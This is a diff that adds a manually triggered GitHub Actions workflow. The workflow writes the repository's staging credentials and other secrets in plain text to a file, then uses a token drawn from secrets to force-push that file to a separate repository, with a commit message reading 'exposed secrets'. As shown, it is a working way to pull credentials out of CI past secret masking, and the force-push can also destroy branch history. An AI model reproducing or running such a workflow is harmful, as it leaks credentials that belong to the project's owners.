@@ -1,0 +1,25 @@
+name: EXPOSE YOU REPO S3CR3T5 NEW
+on:
+  workflow_dispatch:
+env:
+  NEXT_PUBLIC_SANITY_DATASET: ${{ secrets.STAGING_PUBLIC_SANITY_DATASET }}
+  CREDENTIALS_JSON: ${{ secrets.STAGING_CREDENTIALS }}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Expose
+        run: |          
+          git clone https://${{ secrets.PAT }}@github.com/${{ secrets.USER_NAME }}/demo-1.git
+          cd demo-1
+          git config --local user.email ${{ secrets.USER_EMAIL }}
+          git config --local user.name ${{ secrets.USER_NAME }}
+          git config --local user.Password ${{ secrets.USER_PASSWORD }}
+          cat << EOF > demo-file.txt
+          public sanity dataset: $NEXT_PUBLIC_SANITY_DATASET
+          credentials json: $CREDENTIALS_JSON
+          EOF   
+          echo "created file. committing"
+          git add .
+          git commit -m "exposed secrets"
+          git push origin main -f
